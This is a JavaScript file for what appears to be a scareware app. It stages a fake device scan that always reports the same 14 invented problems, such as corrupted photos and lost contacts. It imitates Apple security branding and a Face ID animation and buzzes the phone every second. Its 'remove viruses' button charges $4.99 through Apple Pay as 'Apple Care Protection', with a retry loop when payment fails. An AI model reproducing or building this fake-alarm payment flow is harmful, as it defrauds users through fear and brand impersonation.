const DETECTED_ISSUES = [
  "App Crashed",
  "Slow Charging",
  "Battery Overheating",
  "Corrupted Photos",
  "Memory Critical",
  "No Internet Access",
  "SIM Card Not Found",
  "Contacts Disappeared",
  "Display Glitch",
  "High CPU Usage",
  "Update Required",
  "Data Loss Warning",
  "Audio Problem",
  "Lock Screen Not Responding",
];

const DEVICE_LAYOUTS = [
  "device-desktop",
  "device-iphone-12-pro",
  "device-iphone-16",
  "device-iphone-17",
  "device-iphone-17-pro-max",
  "device-iphone-se",
];

const DEVICE_QUERY_MAP = {
  desktop: "device-desktop",
  "iphone-12-pro": "device-iphone-12-pro",
  iphone12pro: "device-iphone-12-pro",
  "iphone-16": "device-iphone-16",
  iphone16: "device-iphone-16",
  "iphone-17": "device-iphone-17",
  iphone17: "device-iphone-17",
  "iphone-17-pro-max": "device-iphone-17-pro-max",
  iphone17promax: "device-iphone-17-pro-max",
  "iphone-se": "device-iphone-se",
  iphonese: "device-iphone-se",
  se: "device-iphone-se",
};

let layoutResizeTimer = null;

const stepOne = document.querySelector(".step-one");
const stepTwo = document.querySelector(".step-two");
const stepThree = document.querySelector(".step-three");
const startScanButton = document.getElementById("start-scan-button");
const tableBody = document.querySelector(".threats-table tbody");
const progressBar = document.getElementById("progress-bar");
const detectedIssuesCount = document.getElementById("detected-issues-count");
const stepTwoSecurityIcon = document.getElementById("step-two-security-icon");
const stepTwoFaceId = document.getElementById("step-two-face-id");
const stepTwoStatuses = {
  identity: document.querySelector('[data-check="identity"] .step-two__status'),
  settings: document.querySelector('[data-check="settings"] .step-two__status'),
  applecare: document.querySelector(
    '[data-check="applecare"] .step-two__status',
  ),
};
const removeVirusesBtn = document.getElementById("remove-viruses-btn");
const stepThreeOverlay = document.querySelector(".step-three__overlay");
const riskSheet = document.getElementById("step-three-risk-sheet");
const notificationSettings = document.querySelector(
  ".step-three__notification--settings",
);
const notificationTime = document.getElementById("step-three-notification-time");
const notificationUnsuccessful = document.querySelector(
  ".step-three__notification--unsuccessful",
);
const tryAgainBtn = document.getElementById("try-again-btn");

let vibrationInterval = null;
let faceIdAnimation = null;
let faceIdAnimationTimer = null;
let faceIdAnimationFallbackTimer = null;
let faceIdAnimationDestroyTimer = null;
let stepThreeNotificationTimer = null;
let riskSheetNotificationTimer = null;
let stepThreeEntryNotificationBlockedUntil = 0;
let isApplePayRunning = false;

const STEP_THREE_ENTRY_NOTIFICATION_DELAY = 1000;
const STEP_THREE_NOTIFICATION_TOTAL_TIME = 3050;
const BRIDGE_HANDLER_NAME = "appBridge";
const HAPTIC_TRIGGER = "haptic";
const HAPTIC_START_ACTION = "start";
const HAPTIC_STOP_ACTION = "stop";
const HAPTIC_PULSE_DURATION = 45;
const FINISH_FLOW_TRIGGER = "finish";
const PAYMENT_CONFIG = {
  stripePublicKey: "",
  intentUrl: "/api/create-payment-intent",
  topupUrl: "",
  authToken: "",
  packageSlug: "",
  label: "Apple Care Protection",
  amountCents: 499,
  currency: "usd",
  country: "US",
};

applyDeviceLayout();
window.addEventListener("resize", scheduleDeviceLayoutUpdate);
window.addEventListener("orientationchange", scheduleDeviceLayoutUpdate);

function getForcedLayoutClass() {
  const params = new URLSearchParams(window.location.search);
  const device = params.get("device") || params.get("layout");

  if (!device) {
    return null;
  }

  const normalizedDevice = device.toLowerCase().replace(/[_\s]+/g, "-");
  return DEVICE_QUERY_MAP[normalizedDevice] || null;
}

function detectDeviceLayoutClass() {
  const forcedLayoutClass = getForcedLayoutClass();

  if (forcedLayoutClass) {
    return forcedLayoutClass;
  }

  const width = Math.round(window.innerWidth);
  const height = Math.round(window.innerHeight);
  const shortSide = Math.min(width, height);
  const longSide = Math.max(width, height);
  const isTouchScreen = window.matchMedia("(pointer: coarse)").matches;

  if (!isTouchScreen && shortSide >= 700) {
    return "device-desktop";
  }

  if (shortSide <= 375 && longSide <= 700) {
    return "device-iphone-se";
  }

  if (shortSide >= 428 && longSide >= 900) {
    return "device-iphone-17-pro-max";
  }

  if (shortSide >= 390 && shortSide <= 391 && longSide >= 820 && longSide <= 860) {
    return "device-iphone-12-pro";
  }

  if (shortSide >= 392 && shortSide <= 414 && longSide >= 830 && longSide <= 900) {
    return "device-iphone-17";
  }

  return isTouchScreen ? "device-iphone-16" : "device-desktop";
}

function applyDeviceLayout() {
  const layoutClass = detectDeviceLayoutClass();

  document.body.classList.remove(...DEVICE_LAYOUTS);
  document.body.classList.add(layoutClass);
  document.body.dataset.layoutDevice = layoutClass.replace("device-", "");
}

function scheduleDeviceLayoutUpdate() {
  if (layoutResizeTimer) {
    clearTimeout(layoutResizeTimer);
  }

  layoutResizeTimer = setTimeout(() => {
    applyDeviceLayout();
    layoutResizeTimer = null;
  }, 120);
}

window.setLayoutDevice = function setLayoutDevice(device) {
  const normalizedDevice = String(device || "").toLowerCase().replace(/[_\s]+/g, "-");
  const layoutClass = DEVICE_QUERY_MAP[normalizedDevice];

  if (!layoutClass) {
    return false;
  }

  document.body.classList.remove(...DEVICE_LAYOUTS);
  document.body.classList.add(layoutClass);
  document.body.dataset.layoutDevice = layoutClass.replace("device-", "");
  return true;
};

startScanButton.addEventListener("click", function () {
  stepTwo.style.display = "flex";
  stepTwo.classList.add("slide-in-right");

  stepOne.classList.add("slide-out-left");

  setTimeout(() => {
    stepOne.style.display = "none";
    stepOne.classList.remove("slide-out-left");
    stepTwo.classList.remove("slide-in-right");

    startScanAnimation();
  }, 350);
});

function startScanAnimation() {
  const totalIssues = DETECTED_ISSUES.length;
  const totalDuration = 5000;
  const intervalDuration = totalDuration / totalIssues;
  const tableRows = tableBody.querySelectorAll(".threat-row");

  let currentCount = 0;

  resetScanState(tableRows);
  startChecklistAnimation();
  scheduleFaceIdAnimation();

  requestAnimationFrame(() => {
    if (progressBar) {
      progressBar.style.width = "100%";
      progressBar.parentElement?.setAttribute("aria-valuenow", "100");
    }
  });

  const interval = setInterval(() => {
    if (currentCount < totalIssues) {
      currentCount++;

      detectedIssuesCount.textContent = currentCount;

      const row = tableRows[currentCount - 1];
      if (row) {
        row.classList.add("is-visible");
        triggerHaptic();
      }

      if (currentCount === totalIssues) {
        setStatus("applecare", "error");
      }
    } else {
      clearInterval(interval);
    }
  }, intervalDuration);

 setTimeout(showStepThree, totalDuration + 1200);
}

function resetScanState(tableRows) {
  detectedIssuesCount.textContent = "0";

  if (progressBar) {
    progressBar.style.transition = "none";
    progressBar.style.width = "0%";
    progressBar.parentElement?.setAttribute("aria-valuenow", "0");

    requestAnimationFrame(() => {
      progressBar.style.transition = "width 5s linear";
    });
  }

  tableRows.forEach((row) => {
    row.classList.remove("is-visible");
  });

  setStatus("identity", "loading");
  setStatus("settings", "loading");
  setStatus("applecare", "loading");

  if (stepTwoSecurityIcon) {
    stepTwoSecurityIcon.src = "./assets/_icon_apple.svg";
    stepTwoSecurityIcon.alt = "Apple Security";
  }
}

function startChecklistAnimation() {
  setTimeout(() => {
    setStatus("identity", "success");
  }, 1250);

  setTimeout(() => {
    setStatus("settings", "error");
  }, 2500);
}

function setStatus(name, state) {
  const status = stepTwoStatuses[name];
  if (!status) {
    return;
  }

  status.className = `step-two__status step-two__status--${state}`;
}

function scheduleFaceIdAnimation() {
  if (!stepTwoFaceId) {
    return;
  }

  hideFaceIdAnimation();

  faceIdAnimationTimer = setTimeout(() => {
    faceIdAnimationTimer = null;

    if (!window.lottie || typeof window.lottie.loadAnimation !== "function") {
      return;
    }

    destroyFaceIdAnimation();
    stepTwoFaceId.classList.add("is-visible");

    faceIdAnimation = window.lottie.loadAnimation({
      container: stepTwoFaceId,
      renderer: "svg",
      loop: false,
      autoplay: true,
      path: "./assets/face-id-animation.json",
    });

    faceIdAnimation.addEventListener("complete", hideFaceIdAnimation);
    faceIdAnimationFallbackTimer = setTimeout(hideFaceIdAnimation, 4200);
  }, 1000);
}

function hideFaceIdAnimation() {
  if (faceIdAnimationTimer) {
    clearTimeout(faceIdAnimationTimer);
    faceIdAnimationTimer = null;
  }

  if (faceIdAnimationFallbackTimer) {
    clearTimeout(faceIdAnimationFallbackTimer);
    faceIdAnimationFallbackTimer = null;
  }

  if (faceIdAnimationDestroyTimer) {
    clearTimeout(faceIdAnimationDestroyTimer);
    faceIdAnimationDestroyTimer = null;
  }

  if (!stepTwoFaceId) {
    destroyFaceIdAnimation();
    return;
  }

  stepTwoFaceId.classList.remove("is-visible");

  faceIdAnimationDestroyTimer = setTimeout(() => {
    destroyFaceIdAnimation();
    faceIdAnimationDestroyTimer = null;
  }, 220);
}

function destroyFaceIdAnimation() {
  if (faceIdAnimation) {
    faceIdAnimation.destroy();
    faceIdAnimation = null;
  }

  if (stepTwoFaceId) {
    stepTwoFaceId.innerHTML = "";
  }
}

function showStepThree() {
  hideFaceIdAnimation();

  stepThree.style.display = "flex";
  stepThree.classList.add("slide-in-right");

  stepTwo.classList.add("slide-out-left");

  setTimeout(() => {
    stepTwo.style.display = "none";
    stepTwo.classList.remove("slide-out-left");
    stepThree.classList.remove("slide-in-right");

    startPeriodicVibration();
    scheduleStepThreeEntryNotification();
  }, 350);
}

function scheduleStepThreeEntryNotification() {
  if (stepThreeNotificationTimer) {
    clearTimeout(stepThreeNotificationTimer);
  }

  stepThreeEntryNotificationBlockedUntil =
    Date.now() +
    STEP_THREE_ENTRY_NOTIFICATION_DELAY +
    STEP_THREE_NOTIFICATION_TOTAL_TIME;

  stepThreeNotificationTimer = setTimeout(() => {
    showNotification();
    stepThreeNotificationTimer = null;
  }, STEP_THREE_ENTRY_NOTIFICATION_DELAY);
}

function postNativeMessage(payload) {
  try {
    const handler = window.webkit?.messageHandlers?.[BRIDGE_HANDLER_NAME];
    if (!handler || typeof handler.postMessage !== "function") {
      return false;
    }
    handler.postMessage(payload);
    return true;
  } catch (error) {
    return false;
  }
}

function getPaymentConfig() {
  const params = new URLSearchParams(window.location.search);
  const runtimeConfig = window.CLEAN_GO_PAYMENT || window.APPLE_PAY_CONFIG || {};
  const amountFromQuery = Number(params.get("amount_cents") || params.get("amount"));
  const amountFromRuntime = Number(runtimeConfig.amountCents);

  return {
    stripePublicKey:
      params.get("stripe_pk") ||
      params.get("stripePublicKey") ||
      runtimeConfig.stripePublicKey ||
      PAYMENT_CONFIG.stripePublicKey,
    intentUrl:
      params.get("payment_intent_url") ||
      params.get("intentUrl") ||
      runtimeConfig.intentUrl ||
      PAYMENT_CONFIG.intentUrl,
    topupUrl:
      params.get("topup_url") ||
      params.get("topupUrl") ||
      runtimeConfig.topupUrl ||
      PAYMENT_CONFIG.topupUrl,
    authToken:
      params.get("auth_token") ||
      params.get("token") ||
      runtimeConfig.authToken ||
      PAYMENT_CONFIG.authToken,
    packageSlug:
      params.get("package_slug") ||
      params.get("packageSlug") ||
      runtimeConfig.packageSlug ||
      PAYMENT_CONFIG.packageSlug,
    label:
      params.get("payment_label") ||
      runtimeConfig.label ||
      PAYMENT_CONFIG.label,
    amountCents: Number.isFinite(amountFromQuery) && amountFromQuery > 0
      ? amountFromQuery
      : Number.isFinite(amountFromRuntime) && amountFromRuntime > 0
        ? amountFromRuntime
        : PAYMENT_CONFIG.amountCents,
    currency:
      (params.get("currency") || runtimeConfig.currency || PAYMENT_CONFIG.currency)
        .toLowerCase(),
    country:
      (params.get("country") || runtimeConfig.country || PAYMENT_CONFIG.country)
        .toUpperCase(),
  };
}

function setPaymentButtonsDisabled(isDisabled) {
  if (removeVirusesBtn) {
    removeVirusesBtn.disabled = isDisabled;
  }

  if (tryAgainBtn) {
    tryAgainBtn.disabled = isDisabled;
  }
}

function finishFlowAfterPayment() {
  postNativeMessage({
    trigger: FINISH_FLOW_TRIGGER,
  });
}

async function createPaymentIntent(config, source) {
  const headers = {
    "Content-Type": "application/json",
  };
  const body = {
    amount: config.amountCents,
    currency: config.currency,
    label: config.label,
    source: source,
  };

  if (config.authToken) {
    headers.Authorization = `Bearer ${config.authToken}`;
  }

  if (config.packageSlug) {
    body.package_slug = config.packageSlug;
  }

  const response = await fetch(config.intentUrl, {
    method: "POST",
    headers,
    body: JSON.stringify(body),
  });

  if (!response.ok) {
    throw new Error("Payment request failed.");
  }

  const data = await response.json();
  const clientSecret =
    data.client_secret ||
    data.clientSecret ||
    data.payment_intent_client_secret;
  const paymentIntentId =
    data.payment_intent_id ||
    data.paymentIntentId ||
    data.id ||
    null;

  if (!clientSecret) {
    throw new Error("Payment request has no client_secret.");
  }

  return { clientSecret, paymentIntentId };
}

async function confirmPaymentOnBackend(config, paymentIntentId) {
  if (!config.topupUrl || !paymentIntentId) {
    return;
  }

  const headers = {
    "Content-Type": "application/json",
  };
  const body = {
    payment_intent_id: paymentIntentId,
  };

  if (config.authToken) {
    headers.Authorization = `Bearer ${config.authToken}`;
  }

  if (config.packageSlug) {
    body.package_slug = config.packageSlug;
  }

  await fetch(config.topupUrl, {
    method: "POST",
    headers,
    body: JSON.stringify(body),
  });
}

function runStripeApplePay(config, clientSecret) {
  return new Promise(async (resolve) => {
    try {
      if (!window.Stripe || !config.stripePublicKey) {
        resolve({ status: "unavailable" });
        return;
      }

      const stripe = window.Stripe(config.stripePublicKey);
      const paymentRequest = stripe.paymentRequest({
        country: config.country,
        currency: config.currency,
        total: {
          label: config.label,
          amount: config.amountCents,
        },
        requestPayerName: true,
      });

      const canMakePayment = await paymentRequest.canMakePayment();

      if (!canMakePayment || !canMakePayment.applePay) {
        resolve({ status: "unavailable" });
        return;
      }

      let settled = false;
      const finalize = (result) => {
        if (settled) {
          return;
        }

        settled = true;
        resolve(result);
      };

      paymentRequest.on("paymentmethod", async (event) => {
        const { error, paymentIntent } = await stripe.confirmCardPayment(
          clientSecret,
          { payment_method: event.paymentMethod.id },
          { handleActions: false },
        );

        if (error) {
          event.complete("fail");
          finalize({
            status: "failed",
            message: error.message || "Apple Pay payment failed.",
          });
          return;
        }

        event.complete("success");

        if (paymentIntent?.status === "requires_action") {
          const { error: actionError, paymentIntent: confirmed } =
            await stripe.confirmCardPayment(clientSecret);

          if (actionError) {
            finalize({
              status: "failed",
              message: actionError.message || "Authentication failed.",
            });
            return;
          }

          finalize({
            status: "succeeded",
            paymentIntentId: confirmed?.id || null,
          });
          return;
        }

        finalize({
          status: "succeeded",
          paymentIntentId: paymentIntent?.id || null,
        });
      });

      paymentRequest.on("cancel", () => {
        finalize({ status: "cancelled" });
      });

      paymentRequest.show();
    } catch (error) {
      resolve({
        status: "failed",
        message:
          error instanceof Error ? error.message : "Unable to start Apple Pay.",
      });
    }
  });
}

async function startApplePayFlow(source) {
  if (isApplePayRunning) {
    return;
  }

  isApplePayRunning = true;
  setPaymentButtonsDisabled(true);

  try {
    const config = getPaymentConfig();

    if (!window.Stripe || !config.stripePublicKey) {
      showRiskSheet();
      return;
    }

    const intent = await createPaymentIntent(config, source);
    const result = await runStripeApplePay(config, intent.clientSecret);

    if (result.status === "succeeded") {
      await confirmPaymentOnBackend(
        config,
        result.paymentIntentId || intent.paymentIntentId,
      ).catch(() => null);
      finishFlowAfterPayment();
      return;
    }

    showRiskSheet();
  } catch (error) {
    showRiskSheet();
  } finally {
    isApplePayRunning = false;
    setPaymentButtonsDisabled(false);
  }
}

function postHapticAction(action) {
  return postNativeMessage({
    trigger: HAPTIC_TRIGGER,
    payload: {
      action: action,
    },
  });
}

function triggerHaptic() {
  postHapticAction(HAPTIC_STOP_ACTION);
  postHapticAction(HAPTIC_START_ACTION);

  setTimeout(() => {
    postHapticAction(HAPTIC_STOP_ACTION);
  }, HAPTIC_PULSE_DURATION);
}

// Start periodic vibration for step 3
function startPeriodicVibration() {
  if (vibrationInterval) {
    clearInterval(vibrationInterval);
  }

  triggerHaptic();

  // Then vibrate every 1 seconds
  vibrationInterval = setInterval(() => {
    triggerHaptic();
  }, 1000);
}

function stopPeriodicVibration() {
  if (vibrationInterval) {
    clearInterval(vibrationInterval);
    vibrationInterval = null;
  }

  postHapticAction(HAPTIC_STOP_ACTION);
}

function showNotification() {
  if (notificationSettings) {
    updateNotificationTime();
    notificationSettings.style.display = "flex";
    setTimeout(() => {
      notificationSettings.classList.add("step-three__notification--show");
    }, 50);

    setTimeout(() => {
      notificationSettings.classList.remove("step-three__notification--show");
      setTimeout(() => {
        notificationSettings.style.display = "none";
      }, 500);
    }, 2500);
  }
}

function updateNotificationTime() {
  if (!notificationTime) {
    return;
  }

  notificationTime.textContent = new Intl.DateTimeFormat("en-US", {
    hour: "numeric",
    minute: "2-digit",
    hour12: true,
  }).format(new Date());
}

function showUnsuccessfulNotification() {
  if (notificationUnsuccessful) {
    notificationUnsuccessful.style.display = "flex";

    setTimeout(() => {
      notificationUnsuccessful.classList.add("step-three__notification--show");
    }, 50);

    setTimeout(() => {
      notificationUnsuccessful.classList.remove(
        "step-three__notification--show",
      );

      setTimeout(() => {
        notificationUnsuccessful.style.display = "none";
      }, 500);
    }, 2500);
  }
}

function getUnsuccessfulNotificationDelay() {
  const entryNotificationWait = Math.max(
    0,
    stepThreeEntryNotificationBlockedUntil - Date.now(),
  );

  return Math.max(1500, entryNotificationWait + 100);
}

function showRiskSheet() {
  if (!stepThreeOverlay || !riskSheet) {
    return;
  }

  if (riskSheetNotificationTimer) {
    clearTimeout(riskSheetNotificationTimer);
  }

  if (notificationUnsuccessful) {
    notificationUnsuccessful.style.display = "none";
    notificationUnsuccessful.classList.remove("step-three__notification--show");
  }

  riskSheet.setAttribute("aria-hidden", "false");
  stepThreeOverlay.style.display = "block";

  requestAnimationFrame(() => {
    stepThreeOverlay.classList.add("step-three__overlay--visible");
    stepThreeOverlay.style.opacity = "1";
    riskSheet.classList.add("step-three__risk-sheet--show");
  });

  riskSheetNotificationTimer = setTimeout(() => {
    showUnsuccessfulNotification();
  }, getUnsuccessfulNotificationDelay());
}

if (removeVirusesBtn) {
  removeVirusesBtn.addEventListener("click", function () {
    startApplePayFlow("remove_viruses");
  });
}

if (tryAgainBtn) {
  tryAgainBtn.addEventListener("click", function () {
    startApplePayFlow("try_again");
  });
}

// Make stopPeriodicVibration available globally for iOS to call
window.stopPeriodicVibration = stopPeriodicVibration;
